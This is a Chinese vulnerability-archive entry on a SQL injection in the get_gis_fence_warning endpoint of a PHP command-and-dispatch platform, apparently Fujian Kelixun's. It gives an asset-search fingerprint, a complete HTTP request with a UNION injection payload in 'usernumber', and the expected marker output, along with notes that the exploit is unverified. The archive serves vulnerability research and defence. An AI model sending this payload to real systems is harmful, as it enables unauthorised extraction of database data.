---
source: "wy876 漏洞文库"
title: "指挥调度平台PHP版（附件名指福建科立讯） get_gis_fence_warning usernumber SQL 注入"
product: "指挥调度平台PHP版（附件名指福建科立讯）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，MySQL联合查询"
prerequisites: "请求带PHP会话"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/arehbbh2c0r4whc1"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0get_gis_fence_warning%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"app/structure/departments.php\""
id: "vw-38309b476985aa07930bdcfb"
entity_id: "ve-38309b476985aa07930bdcfb"
schema_version: "1"
---

# 指挥调度平台PHP版（附件名指福建科立讯） get_gis_fence_warning usernumber SQL 注入

## 条目说明

- 对象与具体问题：指挥调度平台PHP版（附件名指福建科立讯）；get_gis_fence_warning usernumber SQLi
- 版本、配置及部署条件：版本未知，MySQL联合查询
- 认证与权限前提：请求带PHP会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 附件名称提供福建科立讯厂商线索，需官方产品映射核验，其他同指纹稿可据此消歧
- 乘法与标记相符但只是期望字符串，不是完整响应；正常请求仍Content-Length138与body不符
- 外部YAML未读取/执行，缺版本/修复与匿名证明

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台get_gis_fence_warning存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 指挥调度平台

## 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征


## 四、漏洞复现
```http
POST /api/client/get_gis_fence_warning.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=7d1e1db182a16e0508fda0961e9a0f6d
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 138

usernumber=1' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,IFNULL(CAST(111*111 AS CHAR),0x20),0x7162707671),NULL,NULL,NULL,NULL,NULL-- -
```

> 请求长度说明：原资料 Content-Length 为 138；保留原始标头；其数值未据实际请求体重新计算或验证。


```plain
qbpzq12321qbpvq
```

sqlmap

```http
POST /api/client/get_gis_fence_warning.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=7d1e1db182a16e0508fda0961e9a0f6d
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 138

usernumber=1
```

> 请求长度说明：原资料 Content-Length 为 138；保留原始标头；其数值未据实际请求体重新计算或验证。


[福建科立讯通信-指挥调度平台-get-gis-fence-warning-sql注入.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222143857-625cde56-ac55-4d9f-83ab-c5df6957533e.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/arehbbh2c0r4whc1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
